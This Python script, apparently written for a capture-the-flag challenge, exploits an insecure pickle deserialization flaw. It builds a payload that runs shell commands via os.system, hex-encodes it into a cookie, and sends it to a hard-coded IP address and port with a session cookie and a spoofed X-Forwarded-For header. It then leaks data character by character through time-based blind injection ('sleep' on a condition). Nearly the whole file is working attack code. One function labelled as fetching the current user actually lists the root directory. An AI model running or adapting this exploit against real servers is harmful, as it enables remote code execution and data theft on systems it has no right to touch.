import requests
import pickle
import binascii
import time
import string
import os

os.environ['HTTP_PROXY'] = ''
os.environ['HTTPS_PROXY'] = ''
os.environ['http_proxy'] = ''
os.environ['https_proxy'] = ''
class RCE:
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return (exec, ("__import__('os').system('''"+self.cmd+"''')",))


class CommandBlindInjection:
    def __init__(self, target_url, cookie_sid, base_delay=5):
        """
        初始化盲注工具

        :param target_url: 目标URL
        :param cookie_sid: 会话Cookie中的connect.sid
        :param base_delay: 基础延迟时间（秒）
        """
        self.target_url = target_url
        self.cookie_sid = cookie_sid
        self.base_delay = base_delay
        self.session = requests.Session()

        # 设置请求头
        self.headers = {
            'Host': '45.40.247.139:31307',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Accept-Encoding': 'gzip, deflate',
            'Referer': 'http://45.40.247.139:31307/login',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'X-Forwarded-For': '111.111.111.112',
            'Priority': 'u=0, i'
        }

        # 设置Cookie
        self.cookies = {
            'connect.sid': self.cookie_sid
        }

    def generate_payload(self, command):
        """
        生成序列化payload

        :param command: 要执行的系统命令
        :return: 十六进制编码的payload
        """
        payload = pickle.dumps(RCE(command))
        hex_payload = binascii.hexlify(payload).decode()
        return hex_payload

    def send_request(self, payload):
        """
        发送带有payload的请求

        :param payload: 十六进制编码的payload
        :return: 响应时间（秒）
        """
        self.cookies['Token'] = payload

        start_time = time.time()
        try:
            response = self.session.get(
                f"{self.target_url}/add",
                headers=self.headers,
                cookies=self.cookies,
                timeout=5,
                proxies={}
            )
            elapsed_time = time.time() - start_time
            return elapsed_time
        except requests.exceptions.Timeout:
            return float('inf')
        except Exception as e:
            print(f"请求错误: {e}")
            return 0

    def test_vulnerability(self):
        """
        测试漏洞是否存在
        """
        print("[+] 测试漏洞是否存在...")

        # 测试命令 - 睡眠指定时间
        test_cmd = f"sleep {self.base_delay}"
        payload = self.generate_payload(test_cmd)

        response_time = self.send_request(payload)

        if response_time >= self.base_delay:
            print(f"[+] 漏洞确认! 响应时间: {response_time:.2f}秒")
            return True
        else:
            print(f"[-] 可能不存在漏洞。响应时间: {response_time:.2f}秒")
            return False

    def blind_command(self, command, check_delay=None):
        """
        执行盲注命令

        :param command: 要执行的命令
        :param check_delay: 检查延迟的阈值
        :return: 命令是否执行成功
        """
        if check_delay is None:
            check_delay = self.base_delay

        payload = self.generate_payload(command)
        response_time = self.send_request(payload)

        return response_time >= check_delay

    def extract_data_conditional(self, command_template, charset=None):
        """
        基于条件提取数据（逐字符）

        :param command_template: 命令模板，使用{char}和{position}作为占位符
        :param charset: 字符集
        :return: 提取的数据
        """
        if charset is None:
            charset = string.printable

        result = ""
        position = 1

        print(f"[+] 开始提取数据，字符集: {charset}")

        while True:
            char_found = False

            for char in charset:
                # 构建条件命令
                condition_cmd = command_template.format(char=char, position=position)
                sleep_cmd = f"if {condition_cmd}; then sleep {self.base_delay}; fi"

                print(f"[-] 测试位置 {position}: '{char}'", end="\r")

                if self.blind_command(sleep_cmd):
                    result += char
                    print(f"\n[+] 位置 {position}: '{char}' -> 当前结果: '{result}'")
                    char_found = True
                    break

            if not char_found:
                print(f"\n[!] 在位置 {position} 未找到字符，提取完成")
                break

            position += 1

        return result

    def get_current_user(self):
        """
        获取当前用户名
        """
        print("[+] 提取当前1111...")
        # 检查每个位置的字符是否等于测试字符
        template = "[ $(ls / | cut -c{position}) = '{char}' ]"
        username = self.extract_data_conditional(template)
        print(f"[+] 当前用户: {username}")
        return username



def main():
    # 配置目标信息
    TARGET_URL = "http://45.40.247.139:31307"
    COOKIE_SID = "s%3Am1sEMkPCep7nWZAE3PHgximdHsEUUj7P.uS0TX%2Fdi3Ii7LUEy0noKdpoVLXsTIOduYpYBMy1JPec"
    BASE_DELAY = 2  # 基础延迟时间

    # 创建盲注实例
    injector = CommandBlindInjection(TARGET_URL, COOKIE_SID, BASE_DELAY)

    user = injector.get_current_user()



if __name__ == "__main__":
    main()